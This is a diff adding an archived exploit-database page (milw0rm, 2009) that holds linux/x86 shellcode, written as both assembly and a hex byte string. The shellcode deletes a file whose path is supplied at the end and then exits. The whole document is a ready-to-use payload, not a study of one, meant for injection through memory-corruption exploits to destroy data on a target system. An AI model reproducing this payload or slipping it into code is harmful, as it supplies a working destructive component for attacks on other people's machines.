@@ -1,0 +1,30 @@
+<html><head><title>linux/x86 File unlinker 18 bytes + file path length</title></head><pre>/*
+Author    : darkjoker
+Site      : http://darkjoker.net23.net
+Shellcode : linux/x86 File unlinker 18 bytes + file path length
+
+        .global _start
+_start:
+        jmp     one
+
+two:
+        pop     %ebx
+        movb    $0xa,%al
+        int     $0x80
+
+        movb    $0x1, %al
+        xor     %ebx, %ebx
+        int     $0x80
+
+one:
+        call    two
+        .string &quot;file&quot;
+*/
+
+char main [] =
+&quot;\xeb\x0b\x5b\xb0\x0a\xcd\x80\xb0&quot;
+&quot;\x01\x31\xdb\xcd\x80\xe8\xf0\xff&quot;
+&quot;\xff\xff&quot;
+&quot;file&quot; //Here file path to delete
+
+// milw0rm.com [2009-03-03]</pre></html>
